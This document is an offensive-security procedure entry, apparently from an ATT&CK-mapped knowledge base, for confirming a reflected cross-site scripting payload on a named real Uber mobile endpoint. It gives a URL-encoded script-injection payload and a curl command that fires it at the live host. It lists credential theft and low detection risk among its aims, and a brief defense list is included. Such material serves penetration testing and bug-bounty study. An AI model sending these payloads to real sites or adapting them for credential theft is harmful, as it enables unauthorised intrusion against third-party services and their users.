---
id: proc-verify-xss-reflection-001
name: Verify-Payload-Reflection-and-Execution
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.147Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - xss
  - javascript-execution
  - verification
commands:
  - '[[commands/curl-inject-xss-payload]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Verify-Payload-Reflection-and-Execution

## Summary

This procedure loads the injected endpoint in a browser to confirm the reflected XSS payload executes arbitrary JavaScript, such as an alert, while bypassing XSS auditors due to the SSL-protected context.

## Description

After injection, the response includes unescaped code like {"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"_ga":"asdf\"}}</script><script>alert(1)</script>}, allowing code execution in the browser when the JS file is loaded by the Uber mobile app.

## Requirements

1. Web browser (e.g., Chrome, Firefox)
2. The crafted URL from the injection step
3. Disabled XSS auditor if testing (though not triggered here)

## Defense

Defensive measures and detection strategies:

- Use Content-Security-Policy to block inline scripts
- Sanitize and encode all user inputs in JS contexts
- Log and alert on reflected query parameters containing script tags

## Objectives

1. Observe payload execution in browser
2. Confirm no blocking by security features
3. Validate potential for credential theft

## Instructions

### Step 1: Load in Browser

**Context**: Navigate to the endpoint URL to trigger execution.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
# First fetch to simulate, then open in browser: https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf%22%7D%7D%20%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
```

> Paste the URL into a browser. An alert(1) should pop up, confirming execution.

### Step 2: Inspect via Curl

**Context**: Use curl to grep for the reflected payload.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl -s "https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf%22%7D%7D%20%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E" | grep -i "alert(1)"
```

> Output shows the injected script, verifying reflection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[javascript-execution]]
- [[verification]]
